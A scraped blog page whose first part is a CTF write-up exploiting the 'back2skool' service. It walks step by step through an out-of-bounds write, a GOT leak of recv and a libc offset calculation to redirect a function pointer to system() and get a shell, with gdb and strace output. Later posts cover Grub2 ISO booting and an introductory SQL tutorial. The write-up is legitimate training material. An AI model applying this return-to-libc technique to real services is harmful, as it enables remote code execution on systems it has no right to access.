<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid  4710] recv(4, &quot;\n&quot;, 1, 0)         = 1
[pid  4710] send(4, &quot;Value at position -2147483634: 2&quot;..., 41, 0) = 41
[pid  4710] read(4, &quot;m&quot;, 1)             = 1
[pid  4710] read(4, &quot;a&quot;, 1)             = 1
[pid  4710] read(4, &quot;t&quot;, 1)             = 1
[pid  4710] read(4, &quot;h&quot;, 1)             = 1
[pid  4710] read(4, &quot;\r&quot;, 1)            = 1
[pid  4710] read(4, &quot;\n&quot;, 1)            = 1
[pid  4710] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
Process 4710 detached
$</code></pre>
<p>OK, we’ve got our segmentation fault. Let’s see what was the last instruction pointer.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f /home/back2skool/core 
[...]
Core was generated by `./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f'.
Program terminated with signal 11, Segmentation fault.
#0  0x11111111 in ?? ()
(gdb) </code></pre>
<p>Neat! But what are those numbers? We wrote at position <strong>-2147483634</strong> value <strong>286331153</strong>. The second number is the instruction pointer at which we want to jump with the <code>math</code> function. The first number is computed as follows * the base of our buffer (values) is at a fixed address 0x804c040 * the address at which we want to write is 0x804c078 * we need to write at position values+0x38 * giving a positive index (0x38/4) will give an upper bound error * the negative index is -(2^31 - (0x38/4)) == <strong>-2147483634</strong> * you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</p>
<p>The instruction pointer is the value that we wrote, 0x11111111 in decimal is <strong>286331153</strong>, so we’ve managed to modify the flow of the program by doing a write, and we’ve managed to do so in a predictable way.</p>
<h2 id="second-poc">Second PoC</h2>
<p>We are in the following state: we’ve managed to make our program to jump at any location. But <strong>where</strong> to jump? Because we don’t have any possibility of injecting code, we should rely on the available code. Available code means, our code and the dynamic libraries code which are mapped in our address space.</p>
<p>Let’s inspect again our binary to see what is used from shared libraries.</p>
<pre><code>$ nm -D -u ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
         w __gmon_start__
         U __libc_start_main U __stack_chk_fail U accept U atoi U bind
         U chdir U close U err U exit U fork U free U getpwnam U htonl
         U htons U listen U perror U read U recv U send U setgid
         U setgroups U setsockopt U setuid U signal U socket U vasprintf
$ </code></pre>
<p>Hmm, nothing useful, nothing to execute, nothing to modify the mappings. But hey, if you have access to those functions from libc and because the loader maps the libc to our address space then it means that we have access to other functions from libc, the problem is that we don’t know where they are. A wild <strong>idea appears</strong>, if we knew where one of the function from libc is, we can compute the rest of them by adding some offsets. There are two problems with this idea: <strong>how do we find the offset of a used function</strong> and <strong>how do we compute the offset of an unused function</strong>.</p>
<ul>
<li><p>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</p>
<pre><code>$ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
08048980 &lt;recv@plt&gt;:
 8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre></li>
</ul>
<p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
<ul>
<li><p>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</p>
<pre><code>$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' recv@'
  1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' system@'
  1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
$ echo $((0x00039100-0x000cebf0))
-613104</code></pre></li>
</ul>
<p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. address_of_recv_function+OFFSET.</p>
<pre><code>$ telnet localhost 31337
read
Input position to read from:
-32
Value at position -32: -1217696784
write
Input position to write to:
-2147483634
Input numeric value to write:
-1218309888
Value at position -2147483634: -1218309888
math
Result of math: -1</code></pre>
<p>Reading from <strong>-32</strong> it’s equivalent of reading -32*4 bytes before our buffer. 0x804c040-32*4 is 0x804bfc0, this is the <code>recv</code> GOT entry. <strong>-1218309888</strong> is -1217696784-613104.</p>
<p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid  4901] send(4, &quot;Value at position -2147483634: -&quot;..., 43, 0) = 43
[pid  4901] read(4, &quot;m&quot;, 1)             = 1
[pid  4901] read(4, &quot;a&quot;, 1)             = 1
[pid  4901] read(4, &quot;t&quot;, 1)             = 1
[pid  4901] read(4, &quot;h&quot;, 1)             = 1
[pid  4901] read(4, &quot;\r&quot;, 1)            = 1
[pid  4901] read(4, &quot;\n&quot;, 1)            = 1
[...]
[pid  4902] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;], [/* 31 vars */]) = 0
[pid  4902] brk(0)                      = 0x9a04000
[...]</code></pre>
<p>We successfully <strong>called execve</strong>!</p>
<h2 id="parameters-to-execve">Parameters to execve</h2>
<p>We are able to run <code>execve</code> but we don’t control the parameters … yet. Let’s see with what parameters <code>execve</code> is called.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
Reading symbols from /root/back2skool-3fbcd46db37c50ad52675294f5667909d1f...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child 
(gdb) catch syscall execve 
Catchpoint 1 (syscall 'execve' [11])
(gdb) r
[...]
Catchpoint 1 (call to syscall 'execve'), 0xb7fe2424 in __kernel_vsyscall ()
(gdb) info registers 
eax            0xffffffda	-38
ecx            0xbffff3b4	-1073744972
edx            0xbffff5ac	-1073744468
ebx            0xb7fa5a5a	-1208329638
[...]
(gdb) x/s $ebx
0xb7fa5a5a:	 &quot;/bin/sh&quot;
(gdb) x/5x $ecx
0xbffff3b4:	0xb7fa5a5f	0xb7fa5a57	0x0804c040	0x00000000
0xbffff3c4:	0xb7ead180
(gdb) x/s ((char **)$ecx)[0]
0xb7fa5a5f:	 &quot;sh&quot;
(gdb) x/s ((char **)$ecx)[1]
0xb7fa5a57:	 &quot;-c&quot;
(gdb) x/s ((char **)$ecx)[2]
0x804c040 &lt;values&gt;:	 &quot;&quot;
(gdb) </code></pre>
<p>Because we’re using <code>system</code> function the first parameters are set accordingly (<code>sh -c</code>) but the actual command (<code>(char **)$ecx)[2]</code>) is empty. You can have a look at <code>execve</code> syscall <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">parameters</a> and the <a href="http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64">calling convention</a> for it. Here we’re very <strong>lucky</strong>, the command that is passed to system is our buffer with values, the initial table. Let’s recap our approach: * get the address of <code>recv</code> function via GOT * set the pointer of <code>math</code> function to <code>system</code> by adding an offset to <code>recv</code> function address * set the parameters in the workspace table * trigger the exploit by using the <code>math</code> function * profit</p>
<h2 id="getting-some-output">Getting some output</h2>
<p>The only problem was that the communication socket was number 4 and the output went to file descriptor 1, but running the command with <code>&gt;&amp;4 2&gt;&amp;4</code> appended, did the trick for us.</p>
<h2 id="the-offset-the-achilles-heel-of-the-exploit">The offset, the Achilles’ Heel of the exploit</h2>
<p>Well, the exploit worked locally, but remote it didn’t.</p>
<p>Recall that when computing the offset of <code>system</code> function in respect to <code>recv</code> function, we were able to access the libc that was used on the target <code>system</code>. A few ideas appeared:</p>
<ul>
<li>try different offsets by gathering as many libcs as possible from well known distros. After one hour of trying all the libc binaries from Ubuntu I start to wonder if I’m on the right track.</li>
<li>try random values - this didn’t work at all and it was time consuming (I was already tired and my thinking was bad)</li>
<li>get a copy of in use libc - this is a problem, because we cannot do <code>open</code>, in the best case, we might do some <code>send</code> over the socket using as buffer input the libc mapping.</li>
<li>hope for the best, and use another challenge (which we already exploited) and download that libc file and hope that this system has the same one.</li>
<li>try to do a more intelligent search by matching function entries (<code>push %ebp</code>, <code>mov %esp, %ebp</code> etc.), this would require too much work.</li>
<li>use some magical tool/table that I’m not sure it exists.</li>
</ul>
<p>We used a <strong>previous</strong> level and was able to <strong>download</strong> the libc, this libc was identical with the one that was in use by the current challenge, so we were able to compute the offset for the remote system.</p>
<p>I don’t know of any method of doing a reliable return-to-libc attack without knowing the addresses of some functions. Maybe there’s a method of getting all the symbols after knowing the libc base, that would be neat.</p>
<p>The final exploit can be found <a href="res/pwn250.py">here</a>.</p>
<h1 id="conclusion">Conclusion</h1>
<p>We’ve presented a way of doing a return-to-libc attack, even though this is a primitive return-to-libc approach, we used a function from libc. We also had to compute the offset of that function using the address of another function - this makes the exploit unreliable.</p>
<p>In the end, it boils down to have the right skill for using the right tools, it’s nothing fancy.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./grub2-and-iso-boot.html" title="Grub2 and ISO boot">Grub2 and ISO boot</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on October 25, 2012</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>Note: This article focuses on Debian based Linux distributions.</p>
<p><strong>Grub2</strong> is the next generation Linux bootloader that is trying to replace the “Legacy” Grub version. It is a complete rewrite of Grub 1 and only lately becoming fully featured compared to the old version and even comes with some new interesting features.</p>
<p>The old Grub’s configuration was rather straightforward, everything being done in a configuration file in the <code>grub</code> directory of the <code>/boot</code> partition (it’s a common practice to have <code>/boot</code> mounted on a separate filesystem). In Debian it was usually <code>/boot/grub/menu.lst</code> and in Red Hat <code>/boot/grub/grub.conf</code> (sometimes one being a symlink to the other).</p>
<p>The configuration file for Grub2 is <code>/boot/grub/grub.cfg</code>. But the file itself should never be modified (not even root has write access). Instead, this file is generated by commands like <code>update-grub2</code>. It is generated based on other configuration files like (in Debian) <code>/etc/default/grub</code>, which has things like global configurations, timers and default settings.</p>
<p>The menu entries for the operating systems themselves are generated based on files in the <code>/etc/grub.d/</code> directory (in Debian). An interesting feature of Grub2 is the fact that these files are actually Bash scripts. OS entries don’t need to be hard coded, but can be scripted. One such script is the <code>10_linux</code> file that detects any new kernel image in the <code>/boot</code> directory and writes a new entry for it without having to manually add it. Manual entries can also be written in these files (usually in the <code>40_custom</code> script file).</p>
<p>An interesting new feature in Grub2 is the possibility to boot from an ISO file. A LiveCD can be stored in an iso file on disk and loaded by grub without having to burn it onto CD or having to boot the normal system first. A menu entry for ISO booting would look like this:</p>
<pre><code>menuentry &quot;Ubuntu LiveCD&quot; {
        loopback loop (hd0,1)/boot/iso/ubuntu-12.04-desktop-i386.iso
        linux (loop)/casper/vmlinuz boot=casper :iso-scan/filename=/boot/iso/ubuntu-12.04-desktop-i386.iso noprompt noeject
        initrd (loop)/casper/initrd.lz
}</code></pre>
<p>Based on the previous ideas, here’s a way to configure grub to make an entry for every .iso file that you have in a specified directory. First, create a directory to store the .iso files (ex. <code>/boot/iso/</code>) and move your Live CDs there.</p>
<p>Next, make a script in the <code>/etc/grub.d/</code> directory. Let’s call it <code>42_iso</code> (the number in front dictates the order in which the scripts are executed).</p>
<pre><code>#!/bin/bash

ISO_DIR=&quot;/boot/iso/&quot;

for iso in $(ls $ISO_DIR*.iso); do
	echo &quot;menuentry \&quot;$iso\&quot; {&quot;
	echo &quot;set isofile=\&quot;$iso\&quot;&quot;
	echo &quot;loopback loop (hd0,1)\$isofile&quot;
	echo &quot;linux (loop)/casper/vmlinuz boot=casper iso-scan/filename=\$isofile noprompt noeject&quot;
	echo &quot;initrd (loop)/casper/initrd.lz&quot;
	echo &quot;}&quot;

done</code></pre>
<p>Don’t forget to give it executable access. Then run the <code>update-grub2</code> command to generate the Grub2 configuration file.</p>
<pre><code>chmod +x /etc/grub.d/42_iso
update-grub2</code></pre>
<p>Thanks to doraz for suggesting ISO booting with Grub.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./sql.html" title="The fast-track, hands-on, no-nonsense introduction to SQL">The fast-track, hands-on, no-nonsense introduction to SQL</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on October  5, 2012</span>
            by
            <span class="author">Dan Șerban</span>
            </span>

            <p>Rather than relying on dry explanations of mathematical set theory, this tutorial is organized as a survey of SQL statements and techniques. It is designed to let you infer from examples what SQL is all about as well as the kinds of problems it can help you solve.</p>
<p>The promise of this tutorial is that you invest 30 minutes of your time and it will enable you to “speak” SQL right here, right now.</p>
<p>The uncompromising emphasis here is on raw speed of learning new things.</p>
<h3 id="introduction">Introduction</h3>
<p>SQL is the universal language that allows relational database management systems (RDBMS) to communicate with the outside world.</p>
<p>The easiest way for a developer to become familiar with SQL is by using SQLite, a file-based (serverless) RDBMS.</p>
<h3 id="lets-start-coding-already">Let’s start coding already!</h3>
<p>To check whether you already have SQLite on your GNU/Linux system, open up a terminal and run:</p>
<pre><code>which sqlite3 &amp;&amp; echo &quot;OK - SQLite found&quot;</code></pre>
<p>To install SQLite on Ubuntu, simply run:</p>
<pre><code>sudo apt-get install sqlite3</code></pre>
<p>The first few baby steps when learning SQL are: - creating a new database; - creating a new table inside that database; - populating the table with some data.</p>
<p>First, let’s create a new database. In a terminal, run:</p>
<pre><code>sqlite3 /tmp/dev.db</code></pre>
<p>You should see output similar to this:</p>
<pre><code>SQLite version 3.7.13 2012-06-11 02:05:22
Enter &quot;.help&quot; for instructions
Enter SQL statements terminated with a &quot;;&quot;
sqlite&gt;</code></pre>
<p>At this point, SQLite has created and appropriately formatted a new file, <code>/tmp/dev.db</code>, and is now waiting for you to tell it what to do.</p>
<p>You communicate your intent to SQLite by typing in SQL statements.</p>
<p>As we already mentioned, when we start working on a new database, the first thing we do is create a table.</p>
<p>At the <code>sqlite&gt;</code> prompt, type the following SQL statement:</p>
<p>{% highlight sql %} CREATE TABLE presidencies ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, first_name VARCHAR(255), other_names VARCHAR(255), year_from INTEGER, year_to INTEGER, notes TEXT ); {% endhighlight %}</p>
<p>SQLite does not give any output in response, and that means it has successfully executed the statement.</p>
<p>We now have an empty table called <code>presidencies</code>.</p>
<p>Having an empty table in a database is like having an empty spreadsheet in front of you.</p>
<p>The next step is therefore to populate the table with some data.</p>
<p>We do this by using the <code>INSERT</code> statement. Try this:</p>
<p>{% highlight sql %} INSERT INTO presidencies VALUES ( NULL, “Barack”, “Obama”, 2009, 2012, “Won against John McCain” ); {% endhighlight %}</p>
<p>Again, SQLite is not giving us any response, which means the <code>INSERT</code> statement was successfully executed.</p>
<p>If we now query the contents of the table, we should see the newly inserted row. Try this:</p>
<p>{% highlight sql %} SELECT * FROM presidencies; {% endhighlight %}</p>
<p>The output you should see is this:</p>
<pre><code>1|Barack|Obama|2009|2012|Won against John McCain</code></pre>
<p>As you can probably tell, the output is in the format:</p>
<pre><code>id|first_name|other_names|year_from|year_to|notes</code></pre>
<p>Since we set <code>id</code> to <code>NULL</code> in our <code>INSERT</code> statement and <code>id</code> has the <code>AUTOINCREMENT</code> attribute in the table definition, SQLite assigned the first available positive integer value and stored it as this record’s primary key.</p>
<p>“Primary key” simply means two things: - The developer has communicated his intention to use this field to uniquely identify each row of this table; - The RDBMS will therefore enforce the uniqueness of this key and use this information to optimize its execution of SQL statements against this table.</p>
<p>Let’s put this behavior to the test. Try the same <code>INSERT</code> statement as before, only replace <code>NULL</code> with <code>1</code> (an already existing <code>id</code>):</p>
<p>{% highlight sql %} INSERT INTO presidencies VALUES ( 1, “Barack”, “Obama”, 2009, 2012, “Won against John McCain” ); {% endhighlight %}</p>
<p>The output you should see is:</p>
<pre><code>Error: PRIMARY KEY must be unique</code></pre>
<p>To change a record in the table, we are going to use an <code>UPDATE</code> statement with a precisely targeted <code>WHERE</code> clause:</p>
<p>{% highlight sql %} UPDATE presidencies SET notes = “His campaign slogan was yes-we-can” WHERE id = 1; {% endhighlight %}</p>
<p>Query the whole table again to see the changes:</p>
<p>{% highlight sql %} SELECT * FROM presidencies; {% endhighlight %}</p>
<p>The output you should see is this:</p>
<pre><code>1|Barack|Obama|2009|2012|His campaign slogan was yes-we-can</code></pre>
<p>To remove a record from the table, we are going to use a precisely targeted <code>DELETE</code> statement:</p>
<p>{% highlight sql %} DELETE FROM presidencies WHERE id = 1; {% endhighlight %}</p>
<p>Query the whole table again to verify that it’s empty.</p>
<p>To continue exploring the features of SQL we are going to need a lot more data.</p>
<p>Paste the statements below at the <code>sqlite&gt;</code> prompt:</p>
<p>{% highlight sql %} INSERT INTO presidencies VALUES (NULL, “Theodore”, “Roosevelt”, 1905, 1908, “”); INSERT INTO presidencies VALUES (NULL, “William”, “Taft”, 1909, 1912, “”); INSERT INTO presidencies VALUES (NULL, “Woodrow”, “Wilson”, 1913, 1916, “1st term; WW 1 begins”); INSERT INTO presidencies VALUES (NULL, “Woodrow”, “Wilson”, 1917, 1920, “2nd term; WW 1 ends”); INSERT INTO presidencies VALUES (NULL, “Warren”, “Harding”, 1921, 1922, “”); INSERT INTO presidencies VALUES (NULL, “Calvin”, “Coolidge”, 1923, 1924, “1st term”); INSERT INTO presidencies VALUES (NULL, “Calvin”, “Coolidge”, 1925, 1928, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Herbert”, “Hoover”, 1929, 1932, “”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1933, 1936, “1st term”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1937, 1940, “2nd term; WW 2 begins”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1941, 1944, “3rd term”); INSERT INTO presidencies VALUES (NULL, “Harry”, “Truman”, 1945, 1948, “1st term; WW 2 ends”); INSERT INTO presidencies VALUES (NULL, “Harry”, “Truman”, 1949, 1952, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Dwight”, “Eisenhower”, 1953, 1956, “1st term”); INSERT INTO presidencies VALUES (NULL, “Dwight”, “Eisenhower”, 1957, 1960, “2nd term”); INSERT INTO presidencies VALUES (NULL, “John”, “F. Kennedy”, 1961, 1963, “”); INSERT INTO presidencies VALUES (NULL, “Lyndon”, “Johnson”, 1964, 1964, “Took over when JFK was assassinated”); INSERT INTO presidencies VALUES (NULL, “Lyndon”, “Johnson”, 1965, 1968, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Richard”, “Nixon”, 1969, 1972, “1st term”); INSERT INTO presidencies VALUES (NULL, “Richard”, “Nixon”, 1973, 1974, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Gerald”, “Ford”, 1975, 1976, “”); INSERT INTO presidencies VALUES (NULL, “Jimmy”, “Carter”, 1977, 1980, “”); INSERT INTO presidencies VALUES (NULL, “Ronald”, “Reagan”, 1981, 1984, “1st term”); INSERT INTO presidencies VALUES (NULL, “Ronald”, “Reagan”, 1985, 1988, “2nd term”); INSERT INTO presidencies VALUES (NULL, “George”, “H. W. Bush”, 1989, 1992, “”); INSERT INTO presidencies VALUES (NULL, “Bill”, “Clinton”, 1993, 1996, “1st term”); INSERT INTO presidencies VALUES (NULL, “Bill”, “Clinton”, 1997, 2000, “2nd term”); INSERT INTO presidencies VALUES (NULL, “George”, “W. Bush”, 2001, 2004, “1st term”); INSERT INTO presidencies VALUES (NULL, “George”, “W. Bush”, 2005, 2008, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Barack”, “Obama”, 2009, 2012, “”); {% endhighlight %}</p>
<p>Let’s see how many records our table contains now:</p>
<p>{% highlight sql %} SELECT COUNT(*) FROM presidencies; {% endhighlight %}</p>
<p>The table has 30 rows.</p>
<p>We want to generate a deduplicated list of all persons who held office.</p>
<p>The SQL keyword <code>DISTINCT</code> performs the deduplication magic, and we are going to make use of the SQL text concatenation operator <code>||</code>:</p>
<p>{% highlight sql %} SELECT DISTINCT first_name || ‘’ || other_names AS full_name FROM presidencies; {% endhighlight %}</p>
<p>We want to find out how many presidencies began in the second half of the 20th century.</p>
<p>{% highlight sql %} SELECT COUNT(*) FROM presidencies WHERE year_from BETWEEN 1950 AND 1999; {% endhighlight %}</p>
<p>The answer to that question is 14 records.</p>
<p>In 1941, the surprise attack at Pearl Harbor happened.</p>
<p>We would like to know who was president of the United States at that time.</p>
<p>{% highlight sql %} SELECT * FROM presidencies WHERE 1941 BETWEEN year_from AND year_to; {% endhighlight %}</p>
<p>The expected output:</p>
<pre><code>12|Franklin|D. Roosevelt|1941|1944|3rd term</code></pre>
<p>We stored some notes on when both world wars began and ended. Let’s query that information by asking for all records that contain the string &quot; WW &quot; inside the <code>notes</code> column.</p>
<p>To perform text matching we need to use the <code>LIKE</code> predicate.</p>
<p>Note: The percent sign has wildcard semantics in SQL.</p>
<p>{% highlight sql %} SELECT * FROM presidencies WHERE notes LIKE ‘% WW %’ ORDER BY year_from; {% endhighlight %}</p>
<p>The expected output:</p>
<pre><code>4|Woodrow|Wilson|1913|1916|1st term; WW 1 begins
5|Woodrow|Wilson|1917|1920|2nd term; WW 1 ends
11|Franklin|D. Roosevelt|1937|1940|2nd term; WW 2 begins
13|Harry|Truman|1945|1948|1st term; WW 2 ends</code></pre>
<p>We want a breakdown of how many presidencies were full-term (lasted the full 4 years) versus how many lasted 1 or 2 or 3 years.</p>
<p>That can also be done in SQL, however the syntax is slightly more convoluted.</p>
<p>{% highlight sql %} SELECT 1 + year_to - year_from AS duration, COUNT(*) AS cnt FROM presidencies GROUP BY duration ORDER BY cnt DESC; {% endhighlight %}</p>
<p>The expected output:</p>
<pre><code>4|24
2|4
1|1
3|1</code></pre>
<p>That means there were 24 presidencies which lasted the full 4 years, 4 which lasted 2 years etc.</p>
<p><strong>Important side note</strong></p>
<p>Being able to get predictable, consistent performance is an important part of software development, and there are some performance considerations to take into account when using <code>WHERE</code> clauses.</p>
<p>The database engine performs these <code>WHERE</code> lookups significantly faster when it can rely on indexes.</p>
<p>Let’s say we know ahead of time that the most frequent queries are going to filter by <code>year_from</code> and <code>year_to</code>.</p>
<p>In that case we need to create indexes on both fields:</p>
<p>{% highlight sql %} CREATE INDEX index_on_year_from ON presidencies (year_from); CREATE INDEX index_on_year_to ON presidencies (year_to); {% endhighlight %}</p>
<p>Indexes do not make a big difference on a table with 30 records, but it is recommended to get into the habit of thinking about indexes before SQL execution times start to grow out of control.</p>
<h3 id="foreign-key-relationships-the-one-to-many-case">Foreign key relationships: the ONE-TO-MANY case</h3>
<p>Let us now explore how we can build database models for information entities which are related to one another.</p>
<p>We are going to use the geographical hierarchy of continents <code>-&gt;</code> countries <code>-&gt;</code> cities to illustrate this. - A continent has many countries - A country has many cities</p>
<p>Conversely: - A city belongs to only one country - A country belongs to only one continent</p>
<p>To create tables for each of the three information entities, run the following commands:</p>
<p>{% highlight sql %} CREATE TABLE continents ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, continent_name VARCHAR(255) ); CREATE TABLE countries ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, continent_id INTEGER NOT NULL, country_name VARCHAR(255) ); CREATE TABLE cities ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, country_id INTEGER NOT NULL, city_name VARCHAR(255) ); {% endhighlight %}</p>
<p>Note: SQL experts will notice something is missing from the table definitions above. I have deliberately chosen not to cover foreign key constraints in this beginner-level tutorial in order not to place too much of a cognitive burden on the reader.</p>
<p>Let’s populate these tables with some data I have prepared for you in a file.</p>
<p>Quit SQLite with Ctrl-D, download and inspect the file as shown below:</p>
<pre><code>wget -O /tmp/geography.sql http://dserban.github.com/introduction-to-sql/geography.sql
less /tmp/geography.sql</code></pre>
<p>Load the data into our database <code>dev.db</code> (this operation may take a while on slower computers):</p>
<pre><code>sqlite3 /tmp/dev.db &lt; /tmp/geography.sql</code></pre>
<p>Now open the database again and let’s write some queries.</p>
<pre><code>sqlite3 /tmp/dev.db</code></pre>
<p>The query:</p>
<p>{% highlight sql %} SELECT * FROM continents; {% endhighlight %}</p>
<p>behaves the way you expect.</p>
<p>Next, go ahead and run the query below, and see what happens:</p>
<p>{% highlight sql %} SELECT * FROM continents AS c1, continents AS c2; {% endhighlight %}</p>
<p>The above is definitely a valid SQL statement, and I’m just showing it to you in order for you to get comfortable with the idea that SQL statements may reference more than one database table, and if you reference the same table twice, the output will be the cartesian product of the table’s row set with itself.</p>
<p>Next, try this:</p>
<p>{% highlight sql %} SELECT country_name, continent_name FROM countries, continents WHERE countries.continent_id = continents.id ORDER BY country_name; {% endhighlight %}</p>
<p>What we just did is formally called “traversing a foreign key relationship”.</p>
<p>We retrieved some records from the <code>countries</code> table, found some “pointers” in the <code>continent_id</code> column, went to the <code>continents</code> table, retrieved the continent descriptions pertaining to those pointers, and then brought back those results and associated them with each row in the <code>countries</code> table.</p>
<p>Congratulations, you have just learned about the “R” in “RDBMS”, this is what we mean by “relational”.</p>
<p>Notice one thing: the query above will start suffering from performance issues for tables beyond a certain size.</p>
<p>Before we go on, we want to take care of performance-by-design.</p>
<p>The lookups which happen during foreign key relationship traversal would be much more efficient when supported by the appropriate indexes.</p>
<p>Let’s create indexes on those foreign key columns.</p>
<p>{% highlight sql %} CREATE INDEX index_on_country_id ON cities (country_id); CREATE INDEX index_on_continent_id ON countries (continent_id); {% endhighlight %}</p>
<p>Moreover, <code>country_name</code> and <code>city_name</code> are also worth indexing, since in the future we are very likely to need to locate records based on them.</p>
<p>{% highlight sql %} CREATE INDEX index_on_city_name ON cities (city_name); CREATE INDEX index_on_country_name ON countries (country_name); {% endhighlight %}</p>
<p>Let us now write a query that performs a three-way join:</p>
<p>{% highlight sql %} SELECT city_name, country_name, continent_name FROM cities, countries, continents WHERE cities.country_id = countries.id AND countries.continent_id = continents.id ORDER BY city_name; {% endhighlight %}</p>
<p>In order to avoid repeated typing of complex queries, SQL allows us to store a given <code>SELECT</code> statement under a specific name.</p>
<p>The resulting database object is called a view.</p>
<p>Let’s create a view for the previous <code>SELECT</code> statement:</p>
<p>{% highlight sql %} CREATE VIEW augmented_cities AS SELECT city_name, country_name, continent_name FROM cities, countries, continents WHERE cities.country_id = countries.id AND countries.continent_id = continents.id; {% endhighlight %}</p>
<p>Using the newly created view, we can more comfortably find out all of the information about e.g. the city of London which our database has to offer:</p>
<p>{% highlight sql %} SELECT * FROM augmented_cities WHERE city_name = ‘London’; {% endhighlight %}</p>
<p>The output:</p>
<pre><code>London|United Kingdom|Europe</code></pre>
<p>Next, let’s look at an example of a subquery. Try this:</p>
<p>{% highlight sql %} SELECT continent_name, how_many_countries FROM continents, (SELECT continent_id, COUNT(*) AS how_many_countries FROM countries GROUP BY continent_id) AS breakdows WHERE continents.id = breakdows.continent_id; {% endhighlight %}</p>
<p>The output:</p>
<pre><code>North America|4
South America|9
Europe|32
Africa|15
Asia|17
Oceania|2</code></pre>
<p>What we did here is we joined a real table (<code>continents</code>) with a virtual one called a subquery (the result of a <code>SELECT</code> statement).</p>
<p>We can do this because SQL doesn’t really join tables, it joins rectangular result sets consisting of rows and columns.</p>
<p>Let’s store this query in a view, we are going to make use of it in a future tutorial.</p>
<p>{% highlight sql %} CREATE VIEW continent_statistics AS SELECT continent_name, how_many_countries FROM continents, (SELECT continent_id, COUNT(*) AS how_many_countries FROM countries GROUP BY continent_id) AS breakdows WHERE continents.id = breakdows.continent_id; {% endhighlight %}</p>
<h3 id="foreign-key-relationships-the-many-to-many-case">Foreign key relationships: the MANY-TO-MANY case</h3>
<p>Up to this point, we have explored SQL statements on a single table, as well as one-to-many relationships.</p>
<p>How do we model many-to-many relationships?</p>
<p>How do we model people upvoting news stories on social networks? - One person may upvote more than one story</p>
<p>Conversely: - One story may get upvoted by several people</p>
<p>How do we model project communities which collaborate on Github? - One person may contribute to more than one project</p>
<p>Conversely: - One project may get contributions from several people</p>
<p>The answer is that we need to define a separate information entity which is going to track those complex relationships for us.</p>
<p>In Github’s case, the core information entities are User and Project, and we are going to name the third one Contributorship.</p>
<p>Therefore: - A user has many contributorships - A contributorship belongs to a user - A project has many contributorships - A contributorship belongs to a project</p>
<p>Let’s go ahead and create tables for those three information entities:</p>
